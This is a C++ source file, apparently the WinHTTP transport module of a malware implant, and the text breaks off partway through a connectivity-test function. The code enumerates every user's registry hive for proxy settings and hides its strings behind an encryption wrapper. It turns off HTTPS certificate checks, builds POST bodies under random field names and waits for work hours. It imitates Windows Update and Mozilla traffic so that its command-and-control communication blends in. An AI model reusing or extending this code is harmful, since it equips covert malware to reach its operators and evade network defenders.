/*
	transport_WinHTTP.cpp
	Transport module for WinHTTP library
	Attempts to transfer information using GET/POST HTTP(S) queries, with auto discovery of proxy server

	Use following urls to check for network connectivity
	http://www.download.windowsupdate.com/msdownload/update/v3/static/trustedr/en/authrootseq.txt
	http://www.download.windowsupdate.com/msdownload/update/v3/static/trustedr/en/authrootstl.cab
	http://www.download.windowsupdate.com/msdownload/update/v3/static/trustedr/en/rootsupd.exe

	HTTPS checks
	https://safebrowsing.google.com
	https://aus3.mozilla.org
	https://addons.mozilla.org
	https://fhr.data.mozilla.com
	https://versioncheck-bg.addons.mozilla.org
	https://services.addons.mozilla.org

	Due to execution from service, this module should use WinHTTP and perform auto proxy discovery scanning all HKEY_USERS for a proxy records
	Also note, that success with MS update url does not guarantee access to other urls, because there may be a special setting in main firewall policy
	to allow access to MS sites.
	Also, there may be 80/443 ports closed there (rarely)


	NOTE: Win8 / Win2012 supports WinHttpWebSocketSend(), may be implemented later for direct connections / tunneling with control center

*/

#include <Windows.h>
#include <winhttp.h>

#pragma comment (lib, "winhttp.lib")
#pragma comment (lib, "urlmon.lib")		// user agent request

#include "..\inc\dbg.h"
#include "..\inc\mem.h"					// ?? possibly no need to be converted to API ??
#include "..\inc\CryptoStrings.h"		// +
#include "..\inc\HashedStrings.h"		// +
#include "..\inc\RandomGen.h"
#include "..\inc\MyStringRoutines.h"
#include "..\inc\MyStreams.h"			// need to convert into API
#include "..\inc\DataCallbackManager.h"

#include "..\shared\config.h"

#include "transport_Generic.h"

#include "transport_WinHTTP.h"


/*
	Extended proxy discovery function. In order to detect proxy configuration from a service,
	scan registry for all user profiles and attempt to find out IE's configuration, which is usually kept at
	HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings
	ProxyEnable (REG_DWORD) is set to 1 if proxy used
	ProxyServer (REG_SZ) is the proxy inself, for ex "proxy:3128"

	This routine issues a callback for each found entry, caller should test if a proxy correct (works as needed)
	and return TRUE as a result to stop enumeration
*/
VOID tswhttpEnumUserProxy(CBENUMUSERPROXY cbEnumCallback, LPVOID pCallbackContext)
{
	DWORD dwIndex = 0;	// index value for sequental RegEnumKeyA calls
	LPWSTR lpwszKeyName = NULL;	// buffer to hold name of keys under HKEY_USERS hive
	LPWSTR lpwszTargetKey = NULL; // buffer to hold resulting key name
	LPWSTR lpwszProxyBuffer = NULL; // to hold proxy settings, found in registry

	// decryption targets
	LPWSTR lpwszRegPathTemplate = NULL;	// buffer with reg path template, allocated by decryption routine
	LPWSTR lpwszProxyEnable = NULL;		// ProxyEnable param name to query if proxy enabled
	LPWSTR lpwszProxyServer = NULL;		// ProxyServer param name to query proxy's settings string

	DWORD dwProxyEnable = 0;	// resulting buffer of RegQueryValueExA call for ProxyEnable REG_DWORD 
	DWORD dwBuffLen = 0;		// generic var to hold buffer len in RegQueryValueExA calls

	HKEY hKey = 0;	// var holding RegOpenKeyEx result handle

	__try {

		// buff alloc
		lpwszKeyName = (LPWSTR)my_alloc(1024);
		lpwszTargetKey = (LPWSTR)my_alloc(1024);

		// decrypt reg subkey path to be appended to lpszKeyName and copied into lpszTargetKey
		lpwszRegPathTemplate = CRSTRW("\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\", "\xfe\x3f\x4d\x07\xc3\x3f\x71\x3c\xe1\x21\xb9\xf8\x0f\xd5\x88\xf3\x03\xee\xee\xbd\x41\x94\xc2\x89\x7a\x9b\x1a\x66\x80\x43\x02\x58\xbd\x5b\x4e\x3a\xdc\x15\x48\x01\xfa\x11\xa8\xfd\x1d\xce\x82\xc1\x12\xce\xe3\xbb\x4b\x95\xc3\x8a\x7a\xe7\x1e\x6a\x9a\x53\x04\x41\xa9\x74\x51");
		lpwszProxyEnable = CRSTRW("ProxyEnable", "\xfd\x7f\x5f\x04\xf6\x7f\x6f\x1e\xe2\x7f\xa6\xc9\x03\x86\x9d\xc0\x28\x79\x15");
		lpwszProxyServer = CRSTRW("ProxyServer", "\xfe\xff\x51\x07\xf5\xff\x61\x1d\xe1\xff\xa8\xdc\x0b\x15\x87\xca\x3c\x3d\xb3");
		//DbgPrint("reg tpl [%ws]", lpwszRegPathTemplate);

		// attempt to enum HKEY_USERS elements
		while (ERROR_SUCCESS == RegEnumKey(HKEY_USERS, dwIndex, lpwszKeyName, 1024)) {

			// attempt to parse subkey name
			//DbgPrint("dwIndex=%u name=[%ws]", dwIndex, lpwszKeyName);

			// form resulting key
			lstrcpy(lpwszTargetKey, lpwszKeyName);
			lstrcat(lpwszTargetKey, lpwszRegPathTemplate);

			// try to open that key
			if (ERROR_SUCCESS == RegOpenKeyEx(HKEY_USERS, lpwszTargetKey, 0, KEY_READ, &hKey)) {

				//DbgPrint("opened subkey [%ws]", lpwszTargetKey);

				// try to query ProxyEnable REG_DWORD value to be set to 1
				dwBuffLen = sizeof(DWORD);
				if (ERROR_SUCCESS == RegQueryValueEx(hKey, lpwszProxyEnable, NULL, NULL, (LPBYTE)&dwProxyEnable, &dwBuffLen)) {

					// check value of found param
					if (dwProxyEnable) {

						//DbgPrint("FOUND ProxyEnable=%u", dwProxyEnable);

						// attempt to query lpszProxyServer
						lpwszProxyBuffer = (LPWSTR)my_alloc(1024);
						dwBuffLen = 1024 / 2;
						if (ERROR_SUCCESS == RegQueryValueEx(hKey, lpwszProxyServer, NULL, NULL, (LPBYTE)lpwszProxyBuffer, &dwBuffLen)) {

							// check resulting string len
							if (lstrlen(lpwszProxyBuffer) > 3) {

								// finally got it, convert into wide string and exit while {...} loop
								//DbgPrint("FOUND ProxyServer=[%ws]", lpwszProxyBuffer);

								// pass value to callback
								if (cbEnumCallback(lpwszProxyBuffer, pCallbackContext)) { /*DbgPrint("callback asked to stop enum");*/ break; }


							} // settings strlen check

						} // setting read ok check


						// free used mem (moved to func's exit)
						my_free(lpwszProxyBuffer);

					} // ProxyEnable found to be 1 for this hive check

				} // param found and queried check

				// close reg handle
				RegCloseKey(hKey);
			} // enumerated key opened ok for read


			// inc index and try next
			dwIndex += 1;

		} // while loop



	} __except (1) { DbgPrint("hcRegistryScanForProxy: WARN: exception catched"); }

	// gets here in any case, free used buffers and return failure
	my_free(lpwszKeyName);
	my_free(lpwszTargetKey);
	my_free(lpwszRegPathTemplate);
	my_free(lpwszProxyEnable);
	my_free(lpwszProxyServer);

}


// callback for tswhttpEnumUserProxy() call
// returns TRUE when init performed successfully
BOOL CALLBACK cbProxyEnum(LPWSTR wszProxyFound, LPVOID pCallbackContext)
{
	BOOL bRes = FALSE;	// default value to continue enum
	HINTERNET *phSession = (HINTERNET *)pCallbackContext;	// ptr to resulting hSession is passed at context var ptr 

	*phSession = _tswhttpTestConnection(CONNECTION_PROXY_DISCOVERED, wszProxyFound);

	if (*phSession) { DbgPrint("OK: proxy [%ws] works", wszProxyFound); bRes = TRUE; }

	return bRes;
}

// closes passed WinHTTP handle
VOID _tswhttpClose(HINTERNET hHandle)
{
	if (!hHandle) { DbgPrint("ERR: NULL handle passed"); return; }

	WinHttpCloseHandle(hHandle);
}


/*
	Queries User Agent string
*/
VOID _tswhttpPrepareUserAgent(LPWSTR wszBuffer, DWORD dwBufferLen)
{
	DWORD dwLenOut = 0;
	HRESULT hRes;
	LPSTR szBuffer;

	if (!wszBuffer) { DbgPrint("ERR: no buffer supplied"); return; }

	// WARN: apis return LPSTR string, need to convert it into LPWSTR to be passed to caller
	szBuffer = (LPSTR)my_alloc(1024);

	hRes = UrlMkGetSessionOption(URLMON_OPTION_USERAGENT, szBuffer, 1024, &dwLenOut, 0);
	if (S_OK == hRes) {

		//DbgPrint("user agent(1) [%s]", szBuffer);

	} //else { DbgPrint("ERR: failed to query user agent(1), err %p, le %p, dwLenOut %u", hRes, GetLastError(), dwLenOut); }


	// attempt the same using ObtainUserAgentString(), if nothing returned
	if (*(BYTE *)szBuffer == 0) {
		dwLenOut = 1024;
		hRes = ObtainUserAgentString(0, szBuffer, &dwLenOut);
		if (NOERROR == hRes) {

			//DbgPrint("user agent(2) [%s]", szBuffer);

		} //else { DbgPrint("ERR: failed to query user agent(2), err %p, le %p", hRes, GetLastError()); }
	}

	// translate into LPWSTR, if anything placed in string
	if (*(BYTE *)szBuffer != 0) {
		MultiByteToWideChar(CP_ACP, 0, szBuffer, -1, wszBuffer, dwBufferLen);
		//DbgPrint("user agent=[%ws]", wszBuffer);
	} else { DbgPrint("ERR: empty string"); }

	my_free(szBuffer);

}


// performs WinHTTPOpen() with a passed proxy type
// returns NULL on any error
HINTERNET _tswhttpOpen(WHT_CONNECTION_TYPE wcType, LPWSTR wszProxySetting, LPWSTR wszProxyBypass)
{
	HINTERNET hSession = NULL;	// func result
	DWORD dwProxyType;	// WinHttpOpen()
	LPWSTR wszProxyName;
	LPWSTR wszGoogleCom;	// test url
	LPWSTR wszProxyBypassSetting = WINHTTP_NO_PROXY_BYPASS;

	LPWSTR wszUserAgent = NULL;	// user agent string

	// prepare params according to passed connection type
	switch (wcType) {
	
		case CONNECTION_DIRECT:
			dwProxyType = WINHTTP_ACCESS_TYPE_NO_PROXY;
			wszProxyName = WINHTTP_NO_PROXY_NAME;
			break;

		case CONNECTION_WPAD_AUTOPROXY:
			dwProxyType = WINHTTP_ACCESS_TYPE_DEFAULT_PROXY;	// needs a WPAD discovery call via WinHttpGetProxyForUrl()
			wszProxyName = WINHTTP_NO_PROXY_NAME;
			break;

		case CONNECTION_PROXY_CONFIGURED:
			dwProxyType = WINHTTP_ACCESS_TYPE_DEFAULT_PROXY;	// needs WinHttpGetIEProxyConfigForCurrentUser() call 
			wszProxyName = WINHTTP_NO_PROXY_NAME;
			break;

		case CONNECTION_PROXY_DISCOVERED:
			dwProxyType = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
			wszProxyName = wszProxySetting;
			wszProxyBypassSetting = wszProxyBypass;
			break;

	} // switch

	do {	// not a loop

		// alloc and prepare wszUserAgent
		wszUserAgent = (LPWSTR)my_alloc(1024);
		_tswhttpPrepareUserAgent(wszUserAgent, 512);

		if (!(hSession = WinHttpOpen(wszUserAgent, dwProxyType, wszProxyName, wszProxyBypassSetting, 0))) { DbgPrint("ERR: WinHttpOpen() failed %04Xh", GetLastError()); my_free(wszUserAgent); break; }

		// free mem
		my_free(wszUserAgent);

		// do extra calls, if needed by caller
		if (wcType == CONNECTION_WPAD_AUTOPROXY) {

			WINHTTP_AUTOPROXY_OPTIONS waOptions = { WINHTTP_AUTOPROXY_AUTO_DETECT, WINHTTP_AUTO_DETECT_TYPE_DHCP + WINHTTP_AUTO_DETECT_TYPE_DNS_A, NULL, NULL, 0, TRUE };
			WINHTTP_PROXY_INFO wpInfo = { 0 };

			wszGoogleCom = CRSTRW("www.google.com", "\xfe\x7f\xec\x06\xf0\x7f\xfb\x19\xf9\x29\x0b\xe1\x01\x80\x20\xcb\x60\xa4\x43\xa3\xb8\x12\xf1");
			if ((!WinHttpGetProxyForUrl(hSession, wszGoogleCom, &waOptions, &wpInfo)) || (wpInfo.dwAccessType != WINHTTP_ACCESS_TYPE_NAMED_PROXY)) { DbgPrint("ERR: WPAD discovery failed"); _tswhttpClose(hSession); hSession = NULL; my_free(wszGoogleCom); break; }
			my_free(wszGoogleCom);

			// if WPAD sent an proxy, need to re-init with wpInfo.lpszProxy
			_tswhttpClose(hSession);
			if (wpInfo.lpszProxy) { 
				DbgPrint("WPAD discovered proxy [%ws]", wpInfo.lpszProxy); 
				hSession = _tswhttpOpen(CONNECTION_PROXY_DISCOVERED, wpInfo.lpszProxy, wpInfo.lpszProxyBypass);
			} else {
				DbgPrint("ERR: Bogus result: empty proxy string, assume error");
				hSession = NULL;
			}

			// free fields
			if (wpInfo.lpszProxy) { GlobalFree(wpInfo.lpszProxy); }
			if (wpInfo.lpszProxyBypass) { GlobalFree(wpInfo.lpszProxyBypass); }

		} // CONNECTION_WPAD_AUTOPROXY

		if (wcType == CONNECTION_PROXY_CONFIGURED) {

			WINHTTP_CURRENT_USER_IE_PROXY_CONFIG wiProxy = { 0 };

			if (!WinHttpGetIEProxyConfigForCurrentUser(&wiProxy)) { DbgPrint("ERR: current IE proxy discovery failed"); _tswhttpClose(hSession); hSession = NULL; break; }

			// re-init
			_tswhttpClose(hSession);
			hSession = _tswhttpOpen(CONNECTION_PROXY_DISCOVERED, wiProxy.lpszProxy, wiProxy.lpszProxyBypass);

			// free fields
			if (wiProxy.lpszAutoConfigUrl) { GlobalFree(wiProxy.lpszAutoConfigUrl); }
			if (wiProxy.lpszProxy) { GlobalFree(wiProxy.lpszProxy); }
			if (wiProxy.lpszProxyBypass) { GlobalFree(wiProxy.lpszProxy); }

		} // CONNECTION_PROXY_CONFIGURED

		// adjusting default buffer sizes is useless due to corresponding option stated deprecated and
		// buffer size management is done by WinHTTP internally

	} while (FALSE);	// not a loop

#ifdef _DEBUG
	DbgPrint("hSession=%u mode %u", hSession, wcType);
#endif

	return hSession;
}

/*
	Prepares headers and POST body according to data passed at pPOSTData & dwPOSTDataLen
	NB: headers are UNICODE, while boundary at POST query is ANSI !
*/
BOOL _tswhttpEncodePOST(LPWSTR *wszExtraHeaders, LPVOID *pOptional, DWORD *dwOptionalLen, LPVOID pPOSTData, DWORD dwPOSTDataLen)
{
	BOOL bRes = FALSE;	// func result by default
	RndClass rg = { 0 };	// for generating rnd values
	MY_STREAM mStream = { 0 };	// for accumulating result to be placed at pOptional & dwOptionalLen

	// header's boundary values, to complete 12-bytes
	DWORD dwBoundary;
	WORD wBoundary;

	LPWSTR wszExtraHeadersTemplate;	// decrypted template for headers
	LPSTR szTmpBuffer;	// internal tmp buffer used for template wsprintfA()
	LPSTR szTemplate;	// decrypted template
	LPWSTR wszRndName;	// random name for POST field
	int iLen;	// result of wsprintf() calls, in CHARS

	// check input
	if (!pPOSTData || !dwPOSTDataLen || !wszExtraHeaders || !pOptional || !dwOptionalLen) { DbgPrint("ERR: invalid input params"); return bRes; }

	// init internals
	rgNew(&rg);
	if (!msInitStream(&mStream)) { DbgPrint("ERR: failed to init mStream"); return bRes; }

	// generate boundary value
	wBoundary = (WORD)(rg.rgGetRndDWORD(&rg) & 0x0000FFFF);
	dwBoundary = rg.rgGetRndDWORD(&rg);

	// make headers
	*wszExtraHeaders = (LPWSTR)my_alloc(1024);
	wszExtraHeadersTemplate = CRSTRW("Content-Type: multipart/form-data; boundary=%04x%08x\r\n", "\xff\xbf\xa5\x0c\xc9\xbf\x86\x0b\xe1\xb3\x40\xea\x1b\x0a\x51\xdd\x3f\x62\x5f\xe4\x42\x12\x29\x90\x66\x37\xc4\x76\x9b\x88\xe3\x4b\xbd\xea\xc8\x20\xce\x93\xa4\x5f\xaf\xa5\x4a\xf1\x01\x43\x64\xd6\x36\x3a\x40\xf4\x1b\x1f\x60\xd4\x37\x3f\xa8\x0e\xcf\x6a\x08");
	wsprintfW(*wszExtraHeaders, wszExtraHeadersTemplate, wBoundary, dwBoundary);
	my_free(wszExtraHeadersTemplate);

	wszRndName = (LPWSTR)my_alloc(1024);
	sr_genRandomCharsRG(&rg, 8, 14, wszRndName);

	// make POST body, start with heading template
	szTmpBuffer = (LPSTR)my_alloc(1024);
	szTemplate = CRSTRA("--%04x%08x\r\nContent-Disposition: form-data; name=\"%S\"\r\nContent-Type: application/octet-stream\r\n\r\n", "\xfc\x5f\x1d\x00\x9d\x5f\x50\x45\xa9\x17\xa9\xf0\x49\xf7\x85\xd0\x41\xed\x9e\xa7\x42\xf3\x98\x86\x78\x8a\x59\x61\x9f\x37\x52\x5b\xa5\x13\x34\x27\xc2\x3d\x5d\x0e\xe3\x55\xf0\xa5\x08\xa6\xc9\xc9\x77\xc7\xb3\xa9\x41\xe2\xc0\xca\x29\xf4\x3f\x05\xe6\x04\x52\x46\xb8\x02\x33\x3c\x81\x53\x04\x18\xe9\x1d\xbd\xe9\x1c\xb7\xd1\xc1\x2f\x86\xa9\xa1\x43\xe9\xd2\x87\x6f\xd3\x78\x7c\xc1\x34\x49\x5a\xa9\x06\x30\x45\xa6\x0a\x77");
	iLen = wsprintfA(szTmpBuffer, szTemplate, wBoundary, dwBoundary, wszRndName);	// NB: len in chars, not bytes
	my_free(szTemplate);

	//DbgPrint("heading template [%s] len=%u", szTmpBuffer, iLen);

	// write it to output stream
	mStream.msWriteStream(&mStream, szTmpBuffer, iLen);

	// append binary data
	mStream.msWriteStream(&mStream, pPOSTData, dwPOSTDataLen);

	// prepare footer
	szTemplate = CRSTR("\r\n--%04x%08x--\r\n", "\xfd\x9f\xfc\x04\xed\x9f\x91\x66\xa0\xca\x59\xbc\x59\x7f\x79\x9c\x75\x5f\x11\xe1\x20\x4d\x27");
	iLen = wsprintfA(szTmpBuffer, szTemplate, wBoundary, dwBoundary); // NB: len in chars, not bytes
	my_free(szTemplate);

	// append to stream
	mStream.msWriteStream(&mStream, szTmpBuffer, iLen);

	// free other buffers
	my_free(szTmpBuffer);
	my_free(wszRndName);

	// assign buffer to caller
	*pOptional = mStream.pData;
	*dwOptionalLen = mStream.lDataLen;

	bRes = TRUE;

	return bRes;
}

/*
	WARN: this function may freeze for a long time in case of PRESERVE_WORKHOURS_NETWORK_ACCESS settings from global config.h defined
	If caller supply pAnswer & lAnswerLen, it should check and dispose pAnswer buffer, even if lAnswerLen is 0 !
*/
BOOL _tswhttpMakeQuery(HINTERNET hSession, WHT_QUERY_TYPE whRequestType, LPWSTR wszUrl, LPVOID *pAnswer, DWORD *lAnswerLen, LPVOID pPOSTData, DWORD dwPOSTDataLen)
{
	BOOL bRes = FALSE;	// function result
	URL_COMPONENTS ucUrlParts = { 0 };	// for WinHttpCrackUrl()
	HINTERNET hConnect = NULL;	// WinHttpConnect()
	HINTERNET hOpen = NULL;	// WinHttpOpenRequest()

	// for WinHttpSendRequest()
	LPWSTR wszExtraHeaders = WINHTTP_NO_ADDITIONAL_HEADERS;
	DWORD dwHeadersLen = 0;	// by default no headers, set to -1 if headers were generated
	LPVOID pOptional = NULL;
	DWORD dwOptionalLen = 0;

	// check for errors
	if ((!hSession) || (!wszUrl)) { DbgPrint("ERR: invalid input params"); return bRes; }
	if ((whRequestType != REQUEST_TYPE_POST) && (pPOSTData || dwPOSTDataLen)) { DbgPrint("ERR: unable to send POST data in GET query"); return bRes; }

	// workhours check
	tsgenWaitForWorkhours();

	//DbgPrint("url_p=%p", wszUrl);
	//DbgPrint("url=[%ws]", wszUrl);

	// prepare structure with our buffers to avoid no-null-term strings mess up
	ucUrlParts.dwStructSize = sizeof(URL_COMPONENTS);
	ucUrlParts.lpszHostName = (LPWSTR)my_alloc(1024);	ucUrlParts.dwHostNameLength = 512;
	ucUrlParts.lpszUrlPath = (LPWSTR)my_alloc(1024);	ucUrlParts.dwUrlPathLength = 512;


	do {	// not a loop

		// crack url into parts
		if (!WinHttpCrackUrl(wszUrl, 0, 0, &ucUrlParts)) { DbgPrint("ERR: WinHttpCrackUrl() failed, err %04Xh", GetLastError()); break; }
		// nScheme: INTERNET_SCHEME_HTTP = 1, INTERNET_SCHEME_HTTPS = 2
		//DbgPrint("url cracked: scheme=%u host [%ws] path [%ws]", ucUrlParts.nScheme, ucUrlParts.lpszHostName, ucUrlParts.lpszUrlPath);

		// do connection
		if (!(hConnect = WinHttpConnect(hSession, ucUrlParts.lpszHostName, INTERNET_DEFAULT_PORT, 0))) { DbgPrint("ERR: WinHttpConnect() failed %04Xh", GetLastError()); break; }

		DWORD dwFlags = WINHTTP_FLAG_REFRESH;
		LPWSTR wszVerb = NULL;	// GET or POST
		if (ucUrlParts.nScheme == INTERNET_SCHEME_HTTPS) { dwFlags |= WINHTTP_FLAG_SECURE; }

		switch (whRequestType) {
			case REQUEST_TYPE_GET:
				wszVerb = CRSTRW("GET", "\xfe\x3f\x21\x07\xfd\x3f\x06\x2a\xda\x89\x7a");
				break;
			case REQUEST_TYPE_POST:
				wszVerb = CRSTRW("POST", "\xfd\xbf\x6f\x04\xf9\xbf\x5f\x23\xde\x93\x30");
				break;
		} // switch

		if (!(hOpen = WinHttpOpenRequest(hConnect, wszVerb, ucUrlParts.lpszUrlPath, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, dwFlags))) { DbgPrint("ERR: WinHttpOpenRequest() failed %u", GetLastError()); my_free(wszVerb); break; }
		if (wszVerb) { my_free(wszVerb); }

		// set extra options for https query - to bypass certificate errors
		if (ucUrlParts.nScheme == INTERNET_SCHEME_HTTPS) {

			ULONG ulOptionValue = SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
			if (!WinHttpSetOption(hOpen, WINHTTP_OPTION_SECURITY_FLAGS, &ulOptionValue, sizeof(ULONG))) { DbgPrint("ERR: WinHttpSetOption failed to disable cert check, code %u", GetLastError()); break; }
		
		} // INTERNET_SCHEME_HTTPS

		// do request send according to input data
		// for POST query - modify vars and prepare contents
		if (whRequestType == REQUEST_TYPE_POST) {

			if (!_tswhttpEncodePOST(&wszExtraHeaders, &pOptional, &dwOptionalLen, pPOSTData, dwPOSTDataLen)) { DbgPrint("ERR: failed to encode POST query"); break; }
			dwHeadersLen = -1;	// indicate it's a null terminated string and WinHttpSendRequest() should calc it's len internally

		} // REQUEST_TYPE_POST

		if (!WinHttpSendRequest(hOpen, wszExtraHeaders, dwHeadersLen, pOptional, dwOptionalLen, dwOptionalLen, NULL)) { DbgPrint("ERR: WinHttpSendRequest() failed, code %u", GetLastError()); break; }

		// check response code before reading answer
		if (!WinHttpReceiveResponse(hOpen, NULL)) { DbgPrint("ERR: WinHttpReceiveResponse() failed, code %u", GetLastError()); break; }

		// at this stage, we successfully sent query to a remote server, so assume an OK result
		bRes = TRUE;
		DbgPrint("query sent OK");

		// check if caller wants answer back
		if (pAnswer && lAnswerLen) {

			// *** if anything goes wrong in this block - change bRes to FALSE

			//DbgPrint("caller needs answer");

			// prepare internal stream object 
			MY_STREAM mStream = { 0 };
			DWORD dwDataAvailSize = 0;	// for WinHttpQueryDataAvailable()
			DWORD dwDataRead = 0;	// result from WinHttpReadData()
			LPVOID pTempBuffer = NULL;	// temp buffer to be written to stream

			if (!msInitStream(&mStream)) { DbgPrint("ERR: failed to init mStream"); bRes = FALSE; break; }

			do {	// while have more data

				// check how much data left
				dwDataAvailSize = 0;
				if ( (!WinHttpQueryDataAvailable(hOpen, &dwDataAvailSize)) || (!dwDataAvailSize) ) { break; }	
				
				//DbgPrint("have %u to read", dwDataAvailSize);
				pTempBuffer = my_alloc(dwDataAvailSize);

				// get data
				dwDataRead = 0;
				if ((!WinHttpReadData(hOpen, pTempBuffer, dwDataAvailSize, &dwDataRead)) || (dwDataRead != dwDataAvailSize)) { break; }

				// add data to stream
				mStream.msWriteStream(&mStream, pTempBuffer, dwDataRead);

				// free temp buffer with indication
				my_free(pTempBuffer); pTempBuffer = NULL;

			} while (dwDataAvailSize);	// while have more data

			// free temp buffer, if was used or not cleared already
			if (pTempBuffer) { my_free(pTempBuffer); }

			// save result to caller
			// NB: buffers is always allocated, but size may vary, up to 0 !
			DbgPrint("resulting data read len = %u", mStream.lDataLen);
			*pAnswer = mStream.pData;
			*lAnswerLen = mStream.lDataLen;

		} // caller wants answer

	} while (FALSE); // not a loop

	// free possibly allocated mem
	if (wszExtraHeaders) { my_free(wszExtraHeaders); }
	if (pOptional) { my_free(pOptional); }

	// close live handles
	if (hConnect) { WinHttpCloseHandle(hConnect); }
	if (hOpen) { WinHttpCloseHandle(hOpen); }

	// free mem 
	my_free(ucUrlParts.lpszUrlPath);
	my_free(ucUrlParts.lpszHostName);


	return bRes;
}

/*
	Returns one random item from following list
	https://safebrowsing.google.com
	https://aus3.mozilla.org
	https://addons.mozilla.org
	https://fhr.data.mozilla.com
	https://versioncheck-bg.addons.mozilla.org
	https://services.addons.mozilla.org

	NB: caller should dispose returned buffer via my_free()
*/
LPWSTR _tswhttpSelectLegitimateHttpsUrl()
{
	LPWSTR wszRes = NULL;	// func result
	RndClass rg = { 0 }; // random generator

	rgNew(&rg);

	switch (rg.rgGetRnd(&rg, 1, 6)) {

		case 1:	wszRes = CRSTRW("https://safebrowsing.google.com/", "\x00\xe0\x06\x0f\x20\xe0\x0e\x13\x04\xe8\xf5\xbd\xbf\x57\xd5\xc6\xd6\x3d\xa4\xb5\xbf\x4f\x95\x8e\x9e\x7f\x28\x60\x7f\x97\x41\x4b\x55\xf6\x25\x28\x3d\x97\x78"); break;
		case 2:	wszRes = CRSTRW("https://aus3.mozilla.org/", "\xfc\xbf\xc4\x00\xe5\xbf\xcc\x1c\xf8\xb7\x37\xb2\x43\x08\x05\xdd\x3f\x34\x2a\xa5\x43\x1d\x4d\x84\x60\x26\xea\x67\x9e\xc0\xcb"); break;
		case 3:	wszRes = CRSTRW("https://addons.mozilla.org/", "\xfd\x7f\x5a\x03\xe6\x7f\x52\x1f\xf9\x77\xa9\xb1\x42\xc8\x9b\xcf\x29\xa8\xf4\xb8\x03\xca\xd5\x91\x64\xeb\x36\x6a\xc3\x08\x08\x4c\xe2\x27\x41"); break;
		case 4:	wszRes = CRSTRW("https://fhr.data.mozilla.com/", "\xff\xff\xfc\x0a\xe2\xff\xf4\x16\xfb\xf7\x0f\xb8\x40\x48\x3a\xca\x3d\x69\x58\xa3\x5b\x46\x32\x8f\x60\x7d\x95\x6e\x83\x86\xf2\x41\xa0\xaa\x93"); break;
		case 5:	wszRes = CRSTRW("https://versioncheck-bg.addons.mozilla.org/", "\xfc\x3f\xf5\x00\xd7\x3f\xfd\x1c\xf8\x37\x06\xb2\x43\x88\x23\xcd\x3e\xf4\x5c\xa7\x42\x84\x7d\x8d\x6f\xac\xd8\x6a\x8b\x09\xb4\x4c\xa8\x68\xdb\x3b\x82\x0a\xfa\x12\xe5\x2b\x19\xe9\x42\xc8\x27\xcf\x63\x7d\xa9"); break;
		case 6:	wszRes = CRSTRW("https://services.addons.mozilla.org/", "\xfe\xbf\x83\x07\xda\xbf\x8b\x1b\xfa\xb7\x70\xb5\x41\x08\x50\xca\x3c\x71\x2a\xac\x4b\x14\x4d\x8e\x6a\x23\xec\x61\x9d\x89\xce\x40\xb4\xee\xaf\x23\xcf\xc9\x8c\x1d\xe9\xe8\x65"); break;

		default: DbgPrint("ERR: invalid switch range");

	} // switch

	return wszRes;
}

/*
	Performs tests on connection using passed proxy checking type
*/
HINTERNET _tswhttpTestConnection(WHT_CONNECTION_TYPE wcType, LPWSTR wszProxySetting)
{
	HINTERNET hSession = NULL;	// function's result
	LPWSTR wszUrl;	// decrypt buffer
	LPVOID pAnswer = NULL;
	DWORD lAnswerLen = 0;

	// open session
	if (!(hSession = _tswhttpOpen(wcType, wszProxySetting, NULL))) { DbgPrint("open failed for wcType=%u", (DWORD)wcType); return hSession; }

	
	do { // not a loop

		// this check emulates cryptoapi cert auto update

		// attempt to query from a pre-defined urls list, step 1
		// detects if remote connection works
		wszUrl = CRSTRW("http://www.download.windowsupdate.com/msdownload/update/v3/static/trustedr/en/authrootseq.txt", "\xff\xdf\x2a\x0c\xa2\xdf\x22\x10\xfb\xd7\x90\xab\x40\x30\xfd\xd3\x61\x03\x85\xb3\x41\x6b\xa5\x85\x6b\x09\x5d\x6d\x81\xa3\x65\x53\xbc\x92\x1a\x20\xce\xf3\x2f\x4a\xec\xc8\xc7\xab\x02\x34\xee\xcb\x38\x09\x86\xab\x4e\x63\xe5\x91\x7f\x43\x4b\x70\x8a\xe8\x7c\x17\xe0\x94\x1e\x25\xdb\xee\x29\x4b\xfb\xd5\xdf\xf7\x1b\x22\xee\xd6\x60\x02\x84\xeb\x4e\x72\xbe\x8c\x7d\x48\x45\x70\x9c\xa2\x7b\x0a\xbb\x9f\x1e");
		if (!_tswhttpMakeQuery(hSession, REQUEST_TYPE_GET, wszUrl, NULL, NULL, NULL, 0)) { DbgPrint("ERR: query failed"); _tswhttpClose(hSession); hSession = NULL;  break; }
		my_free(wszUrl);
		if (!hSession) { break; }

		// some rnd wait before next query
		Sleep(5000);

		// step 2 - query .cab itself
		// detects if remote connection is not re-routed to some other page (for ex. connection forbidden message from proxy in html with 200 header)
		wszUrl = CRSTRW("http://www.download.windowsupdate.com/msdownload/update/v3/static/trustedr/en/authrootstl.cab", "\xfc\x5f\x73\x00\xa1\x5f\x7b\x1c\xf8\x57\xc9\xa7\x43\xb0\xa4\xdf\x62\x83\xdc\xbf\x42\xeb\xfc\x89\x68\x89\x04\x61\x82\x23\x3c\x5f\xbf\x12\x43\x2c\xcd\x73\x76\x46\xef\x48\x9e\xa7\x01\xb4\xb7\xc7\x3b\x89\xdf\xa7\x4d\xe3\xbc\x9d\x7c\xc3\x12\x7c\x89\x68\x25\x1b\xe3\x14\x47\x29\xd8\x6e\x70\x47\xf8\x55\x86\xfb\x18\xa2\xb7\xda\x63\x82\xdd\xe7\x4d\xf2\xe7\x80\x7e\xc8\x1c\x7c\x9f\x33\x3f\x06\xaf\x06\x51");
		if ((!_tswhttpMakeQuery(hSession, REQUEST_TYPE_GET, wszUrl, &pAnswer, &lAnswerLen, NULL, 0)) || (!lAnswerLen)) { DbgPrint("ERR: query failed"); _tswhttpClose(hSession); hSession = NULL; }
		my_free(wszUrl);
		if (!hSession) { break; }

		// check .cab signature
		if (pAnswer && lAnswerLen) {

			if ((lAnswerLen < 32) || (*(DWORD *)pAnswer != 'FCSM')) {

				DbgPrint("ERR: .cab contents check failure: lAnswerLen=%u, dwSign=%08Xh assumed=%08Xh", lAnswerLen, *(DWORD *)pAnswer, (DWORD)'FCSM');	// MSCF
				_tswhttpClose(hSession); hSession = NULL;

			} // sign/len checks

			// free mem at last
			my_free(pAnswer);

		} // if lAnswerLen
